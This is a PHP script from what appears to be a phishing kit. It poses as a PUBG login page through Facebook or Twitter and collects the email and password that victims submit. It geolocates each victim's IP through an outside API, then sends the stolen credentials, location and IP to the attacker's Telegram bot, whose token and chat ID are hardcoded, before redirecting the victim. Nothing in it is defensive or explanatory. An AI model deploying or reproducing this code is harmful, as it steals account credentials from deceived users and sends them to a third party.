<?php
error_reporting(1);
session_start();
if(isset($_SESSION["last_access"])){
if(@$_SESSION["last_access"] > (time() - 60)){
header("Location: $ads");
exit('Error 505');
}
}
@$houda = explode("\n",file_get_contents('houda.txt'));
if(in_array(@$_POST['email'],@$houda)){
header("Location: $ads");
exit('Error 504');
}else{
file_put_contents('houda.txt',@$_POST['email']."\n",FILE_APPEND);
}
function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        return $ip;
    }
 $ip = getUserIP();
$api = json_decode(file_get_contents("https://my-hooda.tk/api.php?ip=$ip"));
$country= $api->country;
$code = $api->codes;
$flag = $api->flag;
$url= $api->country_code;
$ads = $api->url;
//@mr7ooda///
if($ads !== null){
$ads = $ads;
}else{
$ads = "https://facebook.com";
}
///@mr7ooda////
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
if($email == null and $password == null){
header("Location: ./index.php");
exit;
}
//@mr7ooda//
if($login == "Facebook"){
$houda = $api->login->Facebook;
}else{
$houda = $api->login->Twitter;
}
//@mr7ooda//
date_default_timezone_set("Africa/Cairo");
$time = date("h:i a");
$date = date("d/m/Y");
$id =5191764270; // ايديك
$token ="6199929406:AAFfufrIeo9NWlVObU90e9itheDyMS9wbjg"; // حط التوكن
$msg="
*𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪*

*------------------☾------------------*
*↝ 𝙿𝙰𝙶𝙴 𝚃𝚈𝙿𝙴 » 𝙿𝚄𝙱𝙶 * 
 🔐 *↝ 𝙻𝙾𝙶𝙸𝙽 »* [#$login]($houda) 
 📧 *↝ 𝙴𝙼𝙰𝙸𝙻 » *  `$email`
 📟 *↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 *»  `$password`
📍 *↝ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 » $country *
 ☎️ *↝ 𝙲𝙾𝙳𝙴 *» `$code` ↝ $flag 
 ⚙️ *↝ 𝙸𝙿* »  `$ip` 
 ⏱ *↝ 𝚃𝙸𝙼𝙴 » $time  *
 📝 *↝ 𝙳𝙰𝚃𝙴 » $date *
*------------------☾------------------*
 *↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  *»  [MY VIP](tg://user?id=$id) ツ
";
//@mr7ooda//
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header("Location: $ads");
// ربنا يغفر ليك يا حودة //
?>
